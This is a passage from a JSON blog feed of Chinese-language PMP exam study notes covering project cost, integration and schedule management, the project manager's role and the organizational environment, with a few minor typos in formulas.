src=\"/assets/project-cost-management-1.png\" alt=\"项目成本管理-规划成本管理\"></p>\n<h3 id=\"估算成本\" tabindex=\"-1\"> 估算成本</h3>\n<p>估算成本是对完成项目工作所需资源成本进行近似估算的过程。本过程的作用：确定项目所需的资金。</p>\n<p>通常用某种货币单位进行成本估算, 但有时也可采用其他计量单位, 如人时数或人天数, 以消除通货膨胀的影响, 便于成本比较。</p>\n<p>范围基准：项目范围说明书、WBS、WBS 词典</p>\n<p>估算成本过程得到的成本估算, 通常包括以下内容：</p>\n<ol>\n<li>项目所使用的全部资源的成本</li>\n<li>直接成本和间接成本</li>\n<li>应急储备和管理储备</li>\n</ol>\n<h4 id=\"itto-1\" tabindex=\"-1\"> ITTO</h4>\n<p><img src=\"/assets/project-cost-management-2.png\" alt=\"项目成本管理-估算成本\"></p>\n<h3 id=\"制定预算\" tabindex=\"-1\"> 制定预算</h3>\n<p>制定预算是汇总所有单个活动或工作包的估算成本, 建立一个经批准的成本基准的过程。本过程的主要作用是, 确定可据以监督和控制项目绩效的成本基准。</p>\n<p>项目进度计划：项目进度计划包括项目活动、里程碑、工作包和控制账户的计划开始和完成日期。可根据这些信息, 把计划成本和实际成本汇总到相应的日历时段中。</p>\n<p>成本基准：经过批准的、按时间段分配的项目预算, 不包括任何管理储备, 只有通过正式的变更控制程序才能变更,\n用作与实际结果进行比较的依据。成本基准是不同进度活动经批准的预算的总和。</p>\n<p>成本基准包含应急储备, 但不包括管理储备。想要使用管理储备需要走变更流程, 项目经理不能直接使用。</p>\n<p>成本基准+管理基准=项目预算</p>\n<h4 id=\"itto-2\" tabindex=\"-1\"> ITTO</h4>\n<p><img src=\"/assets/project-cost-management-3.png\" alt=\"项目成本管理-制定预算\"></p>\n<h2 id=\"控制过程组\" tabindex=\"-1\"> 控制过程组</h2>\n<h3 id=\"控制成本\" tabindex=\"-1\"> 控制成本</h3>\n<p>控制成本是监督项目状态, 以更新项目成本和管理成本基准变更的过程。本过程的主要作用是, 在整个项目期间保持对成本基准的维护。</p>\n<h4 id=\"itto-3\" tabindex=\"-1\"> ITTO</h4>\n<ul>\n<li>\n<p>挣值分析：BAC、PV、EV、AC</p>\n</li>\n<li>\n<p>偏差分析：SV、CV、SPI、CPI</p>\n</li>\n<li>\n<p>趋势分析：EAC、ETC</p>\n</li>\n<li>\n<p>SV = EV - PV &lt; 0；SPI = EV / PC &lt; 1 =&gt; 进度落后 =&gt; 需要采取进度压缩、赶工、快速跟进方法</p>\n</li>\n<li>\n<p>SV = EV - PV = 0；SPI = EV / PC = 1 =&gt; 与计划一致</p>\n</li>\n<li>\n<p>SV = EV - PV &gt; 0；SPI = EV / PC &gt; 1 =&gt; 进度提前</p>\n</li>\n<li>\n<p>CV = EV - AC &lt; 0；CPI = EV / AC &lt; 1 =&gt; 成本超支 =&gt; 需要采取资源平滑、资源平衡</p>\n</li>\n<li>\n<p>CV = EV - AC = 0；CPI = EV / AC = 1 =&gt; 与计划一致</p>\n</li>\n<li>\n<p>CV = EV - AC &gt; 0；CPI = EV / AC &gt; 1 =&gt; 成本节约</p>\n</li>\n<li>\n<p>TCPI = (BAC - EV) / (BAC - AC) &gt; 1 =&gt; 很难完成</p>\n</li>\n<li>\n<p>TCPI = (BAC - EV) / (BAC - AC) = 1 =&gt; 正好完成</p>\n</li>\n<li>\n<p>TCPI = (BAC - EV) / (BAC - AC) &lt; 1 =&gt; 很容易完成</p>\n</li>\n<li>\n<p>SPI 仅反映总工作量, 还需要对关键路径单独风险。</p>\n</li>\n<li>\n<p>EV = BAC；当挣值等于预算时, 说明项目的总计划价值已被完全挣回, 项目已经完工。</p>\n</li>\n</ul>\n<p><img src=\"/assets/project-cost-management-4.png\" alt=\"项目成本管理-控制成本\"></p>\n",
      "image": "https://vxhly.github.io/assets/project-cost-management.png",
      "date_published": "2022-07-24T12:00:00.000Z",
      "date_modified": "2022-08-30T01:41:28.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "PMP"
      ]
    },
    {
      "title": "第四章：项目整合管理",
      "url": "https://vxhly.github.io/pmp/knowledge/project-integration-management.html",
      "id": "https://vxhly.github.io/pmp/knowledge/project-integration-management.html",
      "summary": "前言\n记录项目整合管理章节的相关知识、频繁考点。\n\n",
      "content_html": "<div><p>前言</p>\n<p>记录项目整合管理章节的相关知识、频繁考点。</p>\n</div>\n\n<h2 id=\"核心概念\" tabindex=\"-1\"> 核心概念</h2>\n<div><p>提示</p>\n<p>整体管理是指识别、定义、结合、统一与协调项目管理过程组中的各个过程以及项目管理活动, 用一句话来总结项目整合管理,\n其作用犹如项链中的那根线, 将项目管理过程组中需要的各个过程进行有效综合。</p>\n<p>整理管理的主要内容是制定项目章程、制定项目管理计划、指导和管理项目工作、监督项目工作等。</p>\n</div>\n<ul>\n<li>在项目管理中, 整合兼具统一、合并、沟通和建立联系的性质, 这些行动应该贯穿项目始终</li>\n<li>项目整合管理由项目经理负责, 并且整合管理的责任不能被授权或者转移</li>\n<li>项目经理必须对整个项目承担最终责任</li>\n<li>项目越复杂, 相关方的期望越多样化,就需要越全面的整合方法</li>\n</ul>\n<h2 id=\"发展趋势和新兴实践\" tabindex=\"-1\"> 发展趋势和新兴实践</h2>\n<ul>\n<li>项目整合管理知识领域要求整合所有其他知识领域的成果</li>\n<li>与整合管理过程相关的发展趋势包括\n<ul>\n<li>使用自动化工具</li>\n<li>使用可视化管理工具</li>\n<li>项目知识管理</li>\n<li>增加项目经理的职责</li>\n<li>混合型方法</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"迭代和敏捷\" tabindex=\"-1\"> 迭代和敏捷</h2>\n<ul>\n<li>团队成员以领域专家的身份参与整合管理\n<ul>\n<li>团队成员自行制定计划</li>\n<li>团队成员自行决定各个组件的整合方式</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"商业论证\" tabindex=\"-1\"> 商业论证</h2>\n<p>商业论证内包括对于项目目标、方案效益、相对重大事件的简要概叙, 里程碑指某个时间节点, 与之切合。</p>\n<h2 id=\"项目管理流程\" tabindex=\"-1\"> 项目管理流程</h2>\n<p>创建项目章程 =&gt; 收集需求 =&gt; 定义范围 =&gt; 创建 WBS =&gt; 定义活动 =&gt; 排列活动顺序 =&gt; 估算活动持续时间 =&gt; 制定进度计划 =&gt; 估算成本\n=&gt; 制定预算</p>\n<h2 id=\"思维导图\" tabindex=\"-1\"> 思维导图</h2>\n<p><img src=\"/assets/project-integration-management.png\" alt=\"项目整合管理\"></p>\n<h2 id=\"启动过程组\" tabindex=\"-1\"> 启动过程组</h2>\n<h3 id=\"制定项目章程\" tabindex=\"-1\"> 制定项目章程</h3>\n<p>编写一份正式批准项目并授权项目经理在项目活动中使用组织资源的文件过程。</p>\n<p>项目由项目以外的实体来启动,如发起人、项目集或项目管理办公室。</p>\n<p>尽早确认并任命项目经理,项目经理应该参与项目章程的制定,以便对项目需求有基本的了解。</p>\n<p>最好在制定项目章程时就任命,最晚也必须在规划开始之前。</p>\n<p>项目章程是由项目启动者或发起人发布的, 正式批准项目成立, 并授权项目经理动用组织资源开展项目活动的文件。（是项目的“宪法”,\n是项目经理的“尚方宝剑”）</p>\n<p>内容：</p>\n<ul>\n<li>委派的项目经理及其权责</li>\n<li>项目的目的、目标、项目的成功标准</li>\n<li>高层级的需求、高层级的项目描述、高层级的战略和运营假设条件和制约因素</li>\n<li>总体里程碑进度计划、总体预算、整体项目风险</li>\n</ul>\n<h4 id=\"itto\" tabindex=\"-1\"> ITTO</h4>\n<p><img src=\"/assets/project-integration-management-1.png\" alt=\"项目整合管理-制定项目章程\"></p>\n<h2 id=\"计划过程组\" tabindex=\"-1\"> 计划过程组</h2>\n<h3 id=\"制定项目管理计划\" tabindex=\"-1\"> 制定项目管理计划</h3>\n<p>项目管理计划由项目的主要相关方进行批准。</p>\n<p>指南（一般情况下不允许被修改）：</p>\n<p>范围管理计划、需求管理计划、进度管理计划、成本管理计划、质量管理计划、资源管理计划、沟通管理计划、风险管理计划、采购管理计划、相关方参与计划、变更管理计划、配置管理计划。</p>\n<p>项目管理计划是“文件”, 但不是“项目文件”。</p>\n<p>准备和协调项目计划所有组成部分, 并把它们整合为一份综合项目管理计划的过程。</p>\n<p>计划需要通过不断更新来渐进明细, 并且这些更新需要得到控制和批准。</p>\n<p>项目管理计划一旦被确定为基准, 就只有在提出变更请求并经实施整体变更控制过程批准后, 才能变更。</p>\n<p>通常将范围、进度和成本基准合并为一个绩效测量基准, 作为项目的整体基准, 以便据此测量项目的整体绩效。\n子管理计划包括（但不限于）：</p>\n<p>（1）范围管理计划\n（2）需求管理计划\n（3）进度管理计划\n（4）成本管理计划\n（5）质量管理计划\n（6）资源管理计划\n（7）沟通管理计划\n（8）风险管理计划\n（9）采购管理计划\n（10）相关方参与理计划</p>\n<p>项目基准包括：</p>\n<p>（1）进度基准（做多少）\n（2）成本绩效基准（花多少）\n（3）范围基准（做什么）</p>\n<p>其他组件包括：\n（1）变跟管理计划\n（2）配置管理计划\n（3）绩效测量基准\n（4）项目周期描述\n（5）开发方法\n（6）管理审查</p>\n<h4 id=\"itto-1\" tabindex=\"-1\"> ITTO</h4>\n<p><img src=\"/assets/project-integration-management-2.png\" alt=\"项目整合管理-制定项目管理计划\"></p>\n<h2 id=\"执行过程组\" tabindex=\"-1\"> 执行过程组</h2>\n<h3 id=\"指导与管理项目工作\" tabindex=\"-1\"> 指导与管理项目工作</h3>\n<p>执行项目管理计划中所确定的工作, 并实施已批准变更的过程。</p>\n<h4 id=\"itto-2\" tabindex=\"-1\"> ITTO</h4>\n<p><img src=\"/assets/project-integration-management-3.png\" alt=\"项目整合管理-指导与管理项目工作程\"></p>\n<h3 id=\"管理项目知识\" tabindex=\"-1\"> 管理项目知识</h3>\n<p>使用现有知识并生成新知识, 以实现项目目标, 并且帮助组织学习的过程。支持组织运营和未来的项目或阶段。</p>\n<ul>\n<li>显性知识：易使用文字、图片和数字进行编撰的知识</li>\n<li>隐性知识：个人知识以及难以明确表达的知识</li>\n</ul>\n<h4 id=\"itto-3\" tabindex=\"-1\"> ITTO</h4>\n<p><img src=\"/assets/project-integration-management-4.png\" alt=\"项目整合管理-管理项目知识\"></p>\n<h2 id=\"监控过程组\" tabindex=\"-1\"> 监控过程组</h2>\n<h3 id=\"监控项目工作\" tabindex=\"-1\"> 监控项目工作</h3>\n<p>跟踪、审查和报告整体项目进展, 实现项目管理计划中确定的绩效目标的过程。监督是贯穿于整个项目的项目管理活动之一。</p>\n<h4 id=\"itto-4\" tabindex=\"-1\"> ITTO</h4>\n<p><img src=\"/assets/project-integration-management-5.png\" alt=\"项目整合管理-监控项目工作\"></p>\n<h3 id=\"实施整体变更控制\" tabindex=\"-1\"> 实施整体变更控制</h3>\n<p>实施整体变更控制过程贯穿项目始终, 项目经理对此承担最终责任。</p>\n<p>需要了解变更对进度的影响和对成本等等各方面的影响。</p>\n<p>项目文件更新：不管变更有没有被批准, 都需要更新变更日志。</p>\n<p>变更流程：</p>\n<ul>\n<li>【记录】=&gt; 书面记录变更请求；项目经理书面记录（书面日志）, 或要求变更提出者提交书面的变更请求</li>\n<li>【评估】=&gt; 充分了解变更, 评估变更带来的影响；与相关方沟通评估出的影响</li>\n<li>【提交】=&gt; 提交责任人审批；注意, 这里的提交指“项目经理”将变更请求和评估的结果提交给 CCB</li>\n<li>【更新】=&gt; 不管变通过还是不通过, 必须更新日志；如果变更通过, 更新项目管理计划（文件）</li>\n<li>【通知】=&gt; 应将变更的结果通知相关（受影响）的相关方</li>\n</ul>\n<h4 id=\"变更请求-4-种情况\" tabindex=\"-1\"> 变更请求 4 种情况</h4>\n<ol>\n<li>预防措施: 为确保项目工作的未来绩效符合项目管理计划而进行的有目的的活动。这里的预防当然是最好的方式, 根据预防描述,\n可以减少或者没有变更。对实际工作来说肯定是最好的方式, 变更少, 项目成功的可能性大, 当然前提是项目范围定义的确实符合客观实际需求。</li>\n<li>纠正措施: 为使项目工作绩效重新与项目管理计划一致而进行的有目的的活动。纠正说明有偏差了。有偏差要纠正是-大类题目选择依据。</li>\n<li>缺陷补救: 为修正不一致的产品或产品组件而进行的有目的的活动。已经出现质量问题了。说明出现了质量问题了, 也可以理解为偏差过大,\n已经在可交付成果物中表现出来了。跟纠正措施对照比较, 说明纠正措施中的偏差还比较小, 未在可交付成果物中变现出来这种偏差。</li>\n<li>更新: 对正式受控的项目文件或计划等进行的变更, 以反映修改或增加的意见或内容。说明已经为了修正这种巨大偏差,\n需要对项目的计划和基准都需要调整了。</li>\n</ol>\n<h4 id=\"itto-5\" tabindex=\"-1\"> ITTO</h4>\n<p><img src=\"/assets/project-integration-management-6.png\" alt=\"项目整合管理-实施整体变更控\"></p>\n<h2 id=\"收尾过程组\" tabindex=\"-1\"> 收尾过程组</h2>\n<h3 id=\"结束项目或阶段\" tabindex=\"-1\"> 结束项目或阶段</h3>\n<p>存档项目或阶段信息, 完成计划的工作, 释放组织团队资源以展开新的工作。</p>\n<p>项目终止流程（6+2）：</p>\n<ol>\n<li>获得项目发起人和相关方的批准（验收）</li>\n<li>移交最终成果</li>\n<li>总结经验教训, 提供未来项目或阶段使用</li>\n<li>更新组织过程资产</li>\n<li>文件归档</li>\n<li>释放资源、解散项目团队</li>\n<li>衡量并记录客户满意度</li>\n<li>庆功会</li>\n</ol>\n<p>项目提前终止流程：</p>\n<ol>\n<li>在正式的收尾文件中说明项目终止的原因</li>\n<li>把该项目的已完成和未完成的可交付成果移交他人</li>\n<li>总结经验教训, 提供未来项目或阶段使用</li>\n<li>更新组织过程资产</li>\n<li>文件归档</li>\n<li>释放资源、解散项目团队</li>\n</ol>\n<p>项目在完工前提前终止, 则需要在正式的收尾文件中说明项目终止的原因, 并规定正式程序, 把该项目的已完成和未完成的可交付成果移交他人。</p>\n<h4 id=\"itto-6\" tabindex=\"-1\"> ITTO</h4>\n<p><img src=\"/assets/project-integration-management-7.png\" alt=\"项目整合管理-结束项目或阶段\"></p>\n",
      "image": "https://vxhly.github.io/assets/project-integration-management.png",
      "date_published": "2022-07-16T20:02:00.000Z",
      "date_modified": "2022-09-04T04:22:08.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "PMP"
      ]
    },
    {
      "title": "第三章：项目经理的角色",
      "url": "https://vxhly.github.io/pmp/knowledge/project-manager.html",
      "id": "https://vxhly.github.io/pmp/knowledge/project-manager.html",
      "summary": "前言\n记录项目经理的角色章节的相关知识、频繁考点。\n\n",
      "content_html": "<div><p>前言</p>\n<p>记录项目经理的角色章节的相关知识、频繁考点。</p>\n</div>\n\n<h2 id=\"项目经理\" tabindex=\"-1\"> 项目经理</h2>\n<p>项目经理由执行组织委派, 领导团队实现项目目标的个人。</p>\n<p>项目经理 =&gt; 专注项目目标大达成。</p>\n<p>项目经理无需承担项目中的每个角色, 但应具备项目管理知识、技术知识、理解能力和相关经验。项目经理通过沟通领导项目团队进行规划和协调。</p>\n<p>项目经理的影响范围：项目、组织、行业、专业学科、跨领域</p>\n<p>项目目标是由发起人制定和最终决定的。项目经理是来带领团队实现这个目标的个人, 不能对目标有决定权。</p>\n<h2 id=\"pmi-人才三角\" tabindex=\"-1\"> PMI 人才三角</h2>\n<ul>\n<li>技术项目管理技能 =&gt; 有效运用项目管理知识实现项目集或项目的预期成果的能力</li>\n<li>战略和商务管理技能 =&gt; 纵览组织概况并有效协商和执行有利于战略调整和创新的决策和行动的能力</li>\n<li>领导力技能 =&gt; 指导、激励和带领团队的能力（协商、抗压、沟通、解决问题、批判性思考、人际关系技能）</li>\n</ul>\n<h2 id=\"项目经理权力\" tabindex=\"-1\"> 项目经理权力</h2>\n<ul>\n<li>地位 =&gt; 有时称为正式的、权威的、合法权利的, 例如组织或团队授予的正式职位</li>\n<li>信息 =&gt; 例如对信息收集或分发的控制</li>\n<li>参考 =&gt; 例如因为他人的尊重和赞赏, 获得的信任</li>\n<li>情境 =&gt; 例如在特别危机等特殊情况下获得的权利</li>\n<li>个性或魅力 =&gt; 例如魅力、吸引力</li>\n<li>关系 =&gt; 例如参与人人际交际、联系和结盟</li>\n<li>专家 =&gt; 例如拥有的技能和信息、经验、培训、教育、证书</li>\n<li>奖励相关的 =&gt; 例如能够给予表扬、金钱或其他奖励</li>\n<li>处罚或强制力 =&gt; 例如给予纪律处分或施加负面后果的能力</li>\n<li>迎合 =&gt; 例如运用奉承或其他常用手段赢得青睐或合作</li>\n<li>施加压力 =&gt; 例如限制选择或活动自由, 以符合预期的行动</li>\n<li>愧疚 =&gt; 例如强加的义务或责任感</li>\n<li>说服力 =&gt; 例如能够提供论据, 使他人执行预期的行动方案</li>\n<li>回避 =&gt; 例如拒绝参与</li>\n</ul>\n<p>项目经理处于弱矩阵中, 他应该更加注重专家权利、参考权利、魅力权利</p>\n<p>在敏捷项目上, 项目经理的角色是激励团队的领导者。</p>\n<p>项目整合管理是项目经理绝对不能授权出去的工作。</p>\n<h2 id=\"项目经理的领导风格\" tabindex=\"-1\"> 项目经理的领导风格</h2>\n<ul>\n<li>放任型 =&gt; 或称为“无为而治”,允许团队自主决策和设定目标、适合创新</li>\n<li>交易型 =&gt; 关注目标、反馈和成就以确定奖励,例外管理</li>\n<li>服务型 =&gt; 服务优先于领导,处处先为他人着想；关注他人的成长、学习、发展、人际关系、团队与合作</li>\n<li>变革型 =&gt; 通过理想化特质和行为、鼓舞性激励、促进创新和创造、以及个人关怀提高追随者能力</li>\n<li>魅力型 =&gt; 精神饱满、热情洋溢、充满自信、说服力强、能够激励他人</li>\n<li>交互型 =&gt; 结合了交易型、变革型和魅力型的特点</li>\n</ul>\n<p>在项目规划早期和收尾阶段, 独裁式管理风格更加适用。</p>\n",
      "date_published": "2022-07-16T15:20:00.000Z",
      "date_modified": "2022-08-30T01:41:28.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "PMP"
      ]
    },
    {
      "title": "第二章：项目运行环境",
      "url": "https://vxhly.github.io/pmp/knowledge/project-operating-environment.html",
      "id": "https://vxhly.github.io/pmp/knowledge/project-operating-environment.html",
      "summary": "前言\n记录项目运行环境章节的相关知识、频繁考点。\n\n",
      "content_html": "<div><p>前言</p>\n<p>记录项目运行环境章节的相关知识、频繁考点。</p>\n</div>\n\n<h2 id=\"事业环境因素-eef\" tabindex=\"-1\"> 事业环境因素（EEF）</h2>\n<p>不可控、需遵守</p>\n<p>项目团队不能控制的, 将对项目产生影响、限制或指令作用的各种条件。这些因素可能会提高或限制项目管理的灵活性,\n并可能对项目结果产生积极或消极的影响。</p>\n<p>事业环境因素可能会提高或限制项目管理的灵活性。</p>\n<ul>\n<li>市场条件</li>\n<li>社会和文化影响与问题</li>\n<li>法律限制</li>\n<li>商业数据库</li>\n<li>学术研究</li>\n<li>政府或行业标准</li>\n<li>财务考虑因素</li>\n<li>物理环境因素</li>\n</ul>\n<h2 id=\"组织过程资产-opa\" tabindex=\"-1\"> 组织过程资产（OPA）</h2>\n<p>可裁剪、多积累</p>\n<p>执行组织持有并使用的计划、过程、政策、程序和知识库, 会影响对具体项目的管理。在整个项目期间（项目全过程中）,\n项目团队成员可对组织过程资产进行必要的更新和增补。</p>\n<ul>\n<li>过程、政策和程序</li>\n<li>组织知识库</li>\n</ul>\n<h2 id=\"项目的组织结构\" tabindex=\"-1\"> 项目的组织结构</h2>\n<p>与 <a href=\"/views/soft-test/project-management.html#%E9%A1%B9%E7%9B%AE%E7%9A%84%E7%BB%84%E7%BB%87%E7%BB%93%E6%9E%84\">项目的组织结构</a> 一致</p>\n<div><p>警告</p>\n<p>&quot;紧密型矩阵&quot;不是组织结构, 是集中办公的另一种说法</p>\n</div>\n<h2 id=\"项目管理办公室-pmo\" tabindex=\"-1\"> 项目管理办公室 PMO</h2>\n<div><p>定义</p>\n<p>组织中对所辖各项目进行集中协调管理的一个永久性部门</p>\n</div>\n<p>项目管理办公室（PMO）=&gt; 是对与项目相关的治理过程进行标准化, 并促进资源、方法论、工具与技术共享的一个组织结构。PMO\n所支持和管理的项目不一定彼此关联。</p>\n<p>PMO 的类型：</p>\n<ul>\n<li>支持型 =&gt; 支持, 是顾问、项目资源库, 对项目控制程度很低\n<ul>\n<li>顾问的角色, 向项目提供模板、最佳实践、培训, 以及信息和经验教训。这种类型的 PMO 其实就是一个项目资源库, 对项目的控制程度很低。</li>\n</ul>\n</li>\n<li>控制型 =&gt; 支持+要求服从, 对项目控制程度中等\n<ul>\n<li>控制型 PMO 不仅给项目提供支持, 而且通过各种手段要求项目服从。</li>\n</ul>\n</li>\n<li>指令型 =&gt; 直接管理和控制, 对项目控制程度很高, 关注项目中的每一个细节\n<ul>\n<li>指令型 PMO 直接管理和控制项目。这种类型的 PMO 对项目的控制程度很高。</li>\n</ul>\n</li>\n</ul>\n<p>PMO 的主要职能：</p>\n<ul>\n<li>对 PMO 所辖的全部项目的共享资源进行管理</li>\n<li>识别和制定项目管理方法、最佳实践和标准</li>\n<li>指导、辅导、培训和监督</li>\n<li>通过项目审计, 监督对项目管理标准、政策、程序和饿模版的遵守程度</li>\n<li>制定和管理项目政策、程序、模版和其他共享的文件（组织过程资产）</li>\n<li>对跨项目的沟通进行协调</li>\n</ul>\n<h2 id=\"组织文化与影响\" tabindex=\"-1\"> 组织文化与影响</h2>\n<p>组织文化是一种事业环境因素。文化已成为决定项目成功的关键因素, 多元文化能力已成为项目经理的重要能力。</p>\n<h2 id=\"组织系统\" tabindex=\"-1\"> 组织系统</h2>\n<ul>\n<li>系统是动态的</li>\n<li>系统是能优化的</li>\n<li>系统组件睡能优化的</li>\n<li>系统及其组件是不能同时优化</li>\n<li>系统呈现非线性响应（输入的变更并不会产生可预测的输出）</li>\n</ul>\n<h2 id=\"组织治理框架\" tabindex=\"-1\"> 组织治理框架</h2>\n<p>影响：</p>\n<ul>\n<li>组织目标的设定和实现方式</li>\n<li>风险监控和评估方式</li>\n<li>绩效优化方式</li>\n</ul>\n<h2 id=\"项目治理\" tabindex=\"-1\"> 项目治理</h2>\n<p>必须执行的四大职能：监督、控制、整合和决策</p>\n<p>四个治理领域：一致性、风险、绩效、沟通</p>\n",
      "date_published": "2022-07-16T13:00:00.000Z",
      "date_modified": "2022-08-30T01:41:28.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "PMP"
      ]
    },
    {
      "title": "第六章：项目进度管理",
      "url": "https://vxhly.github.io/pmp/knowledge/project-progress-management.html",
      "id": "https://vxhly.github.io/pmp/knowledge/project-progress-management.html",
      "summary": "前言\n记录项目进度管理章节的相关知识、频繁考点。\n\n",
      "content_html": "<div><p>前言</p>\n<p>记录项目进度管理章节的相关知识、频繁考点。</p>\n</div>\n\n<h2 id=\"核心概念\" tabindex=\"-1\"> 核心概念</h2>\n<div><p>提示</p>\n<p>项目进度管理是指让一切按照既定的进度进行, 对项目进行合理的时间管理, 才是保证项目顺利交付的关键,\n那么如何才能做好项目时间管理呢？可以从六个方面入手：定义项目范围, 注重分解工作；对项目工作进行优先排序；项目工期估算；制定项目进度表；进行进度控制；工具使用等。</p>\n</div>\n<p>具有未完项的迭代型进度计划：将需求记录在用户故事中, 然后在建造之前按优先级排序并优化用户故事, 最后在规定的时间盒内开发产品功能。</p>\n<p>按需进度计划：不依赖于以前为产品开发或产品增量制定的进度计划, 而是在资源可用时立即从未完项和工作序列中提取出来开展。</p>\n<h2 id=\"思维导图\" tabindex=\"-1\"> 思维导图</h2>\n<p><img src=\"/assets/project-progress-management.png\" alt=\"项目进度管理\"></p>\n<h2 id=\"如何做好项目进度管理\" tabindex=\"-1\"> 如何做好项目进度管理</h2>\n<p><img src=\"/assets/project-progress-management-0.png\" alt=\"项目进度管理\"></p>\n<h2 id=\"规划过程组\" tabindex=\"-1\"> 规划过程组</h2>\n<h3 id=\"规划进度管理\" tabindex=\"-1\"> 规划进度管理</h3>\n<p>进度管理计划无进度, 只是一个描述如何管理进度的指南。</p>\n<p>为如何在整个项目期间管理项目提供指南和方向。</p>\n<h4 id=\"itto\" tabindex=\"-1\"> ITTO</h4>\n<p><img src=\"/assets/project-progress-management-1.png\" alt=\"项目进度管理-规划进度管理\"></p>\n<h3 id=\"定义活动\" tabindex=\"-1\"> 定义活动</h3>\n<p>识别和记录为完成项目可交付成果而需采取的具体行动的过程。</p>\n<p>将工作包分解为进度活动, 作为对项目工作进行进度估算、规划、执行、监督和控制的基础。</p>\n<p>范围基准：在定义活动时, 需明确考虑范围基准中的项目 WBS、可交付成果、制约因素和假设条件。</p>\n<h4 id=\"itto-1\" tabindex=\"-1\"> ITTO</h4>\n<p><img src=\"/assets/project-progress-management-2.png\" alt=\"项目进度管理-定义活动\"></p>\n<h3 id=\"排列活动顺序\" tabindex=\"-1\"> 排列活动顺序</h3>\n<p>本过程的主要作用是定义工作之间的逻辑顺序, 以便在既定的所有项目制约因素下获得最高的效率。</p>\n<h4 id=\"itto-2\" tabindex=\"-1\"> ITTO</h4>\n<p><img src=\"/assets/project-progress-management-3.png\" alt=\"项目进度管理-排列活动顺序\"></p>\n<h3 id=\"估算活动持续时间\" tabindex=\"-1\"> 估算活动持续时间</h3>\n<p>估算活动持续时间是根据资源估算的结果, 估算完成单项活动所需工作时段数的过程。</p>\n<p>储备分析：</p>\n<ul>\n<li>应急储备（已知 --- 未知）【事先能识别出来的（想得到的） --- 不需求（或不能）主动管理】\n<ul>\n<li>是保护在进度基准中的一段持续时间, 用来应对已经接受的已知风险。</li>\n<li>应急储备在最终的基准中</li>\n<li>项目经理可以直接使用, 不需要走变更流程</li>\n</ul>\n</li>\n<li>管理储备（未知 --- 未知）【事先不能识别出来（想不到的） --- 不需求（或不能）主动管理】\n<ul>\n<li>是为管理控制的目的而特别留出的项目预算, 用来应对项目范围中不可预见的工作。</li>\n<li>管理储备不在最终的基准中</li>\n<li>项目经理需要走变更流程申请</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"itto-3\" tabindex=\"-1\"> ITTO</h4>\n<p><img src=\"/assets/project-progress-management-4.png\" alt=\"项目进度管理-估算活动持续时间\"></p>\n<h3 id=\"制定进度计划\" tabindex=\"-1\"> 制定进度计划</h3>\n<p>制定进度计划是分析活动顺序、持续时间、资源需求和进度制约因素, 创建进度模型, 从而落实项目执行和监控的过程。</p>\n<h4 id=\"itto-4\" tabindex=\"-1\"> ITTO</h4>\n<p>关键路径法</p>\n<ul>\n<li>关键路径是项目中时间最长的活动顺序, 决定着可能的项目最短工期</li>\n<li>总浮动时间：活动延期但不至于延迟项目完工日期。体现进度灵活性</li>\n<li>自由浮动时间：活动延期但不延误任何紧后活动最早开始时间</li>\n<li>关键路径法排出来的进度计划未必可行, 关键路径法不考虑资源约束, 需要配合资源平衡处理</li>\n<li>关键路径上的关键活动的总浮动时间可能是正值也可能是负值</li>\n<li>关键路径不考虑资源约束, 只是考虑约束</li>\n</ul>\n<p>在关键路径上可以进行压缩工期以使总工期缩短, 在非关键路径上利用资源平滑进行抽取资源, 减少人员短缺带来的影响。</p>\n<p>资源优化（解决资源负荷过大）：根据资源供需情况, 来调整进度模型的技术, 用于减少资源负荷的变化。包括：</p>\n<p>（1）资源平衡：如果共享资源或关键资源只在特定时间可用, 数量有限, 或被过度分配,\n就需要进行资源平衡。也可以为保持资源使用量处于均衡水平而进行资源平衡。资源平衡往往导致关键路径改变。【资源被过渡分配,\n出现了资源短缺, 需要进行资源平衡】\n（2）资源平滑：资源平滑不会改变项目关键路径, 活动只在其自由和总浮动时间内延迟, 但资源平滑技术可能无法实现所有资源的优化。【当各个时间段内所需的资源数量起伏太大时,\n需要做资源平滑】</p>\n<p>进度压缩（解决工期问题）：进度压缩技术是指在不缩减项目范围的前提下, 缩短或加快进度工期, 使进度符合要求。</p>\n<p>（1）赶工：通过增加资源, 以最小的成本代价来压缩进度工期的一种技术。例子包括：批准加班、增加额外资源或支付加急费用。只适用于那些通过增加资源就能缩短持续时间的,\n且位于关键路径上的活动。（增加成本）\n（2）快速跟进：将正常情况下按顺序进行的活动或阶段改为至少是部分并行开展。只适用于相互为选择性依赖关系的活动。在某一项活动完成之前开始另一项活动。（增加风险）</p>\n<p>进度落后优先级选择：进度压缩 &gt; 赶工 &gt; 快速跟进</p>\n<p><img src=\"/assets/project-progress-management-5.png\" alt=\"项目进度管理-制定进度计划\"></p>\n<h2 id=\"控制过程组\" tabindex=\"-1\"> 控制过程组</h2>\n<h3 id=\"控制进度\" tabindex=\"-1\"> 控制进度</h3>\n<p>控制进度是监督项目状态, 以更新项目进度和管理进度基准变更的过程。本过程的主要作用是在整个项目期间保持对进度基准的维护,\n且需要在整个项目期间开展。</p>\n<h4 id=\"itto-5\" tabindex=\"-1\"> ITTO</h4>\n<p><img src=\"/assets/project-progress-management-6.png\" alt=\"项目进度管理-控制进度\"></p>\n<h2 id=\"本章重点\" tabindex=\"-1\"> 本章重点</h2>\n<ul>\n<li>如果在执行过程中发现某个活动的总浮动时间为负, 极有可能该活动是关键活动, 而且已经延期</li>\n<li>如果题目中体现了时间要缩短, 需要压缩工期, 选择进度压缩（赶工或者快速跟进）</li>\n<li>如果题目中体现了资源负荷大, 需要平摊负荷, 选择资源优化（资源平衡或资源平滑）</li>\n<li>关键路径上压工期, 非关键路径上抽资源</li>\n<li>进度落后, 产生进度偏差, 优先考虑用纠正措施压缩进度（赶工或快速跟进）；</li>\n<li>如果实在无法符合进度, 不得已的情况下, 再考虑通过变更流程缩减范围或延长进度。</li>\n</ul>\n",
      "image": "https://vxhly.github.io/assets/project-progress-management.png",
      "date_published": "2022-07-20T19:20:00.000Z",
      "date_modified": "2022-09-01T15:03:55.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
